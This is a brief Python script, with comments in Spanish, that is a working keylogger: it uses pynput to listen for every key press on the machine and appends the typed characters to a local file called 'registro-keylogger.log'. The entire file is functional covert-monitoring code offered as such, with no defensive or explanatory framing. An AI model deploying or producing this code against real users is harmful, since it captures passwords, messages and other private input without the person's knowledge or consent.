from pynput.keyboard import Key, Listener

# Función para escribir en el archivo de registro
def escribir_archivo(key):
    with open("registro-keylogger.log", "a") as archivo:
        k = str(key).replace("'", "")
        if k.find("space") > 0:
            archivo.write('\n')
        elif k.find("Key") == -1:
            archivo.write(k)

# Función para manejar la pulsación de teclas
def pulsacion(tecla):
    try:
        escribir_archivo(tecla)
    except AttributeError:
        print("Tecla especial detectada")

# Configurar el listener del teclado
with Listener(on_press=pulsacion) as listener:
    listener.join()

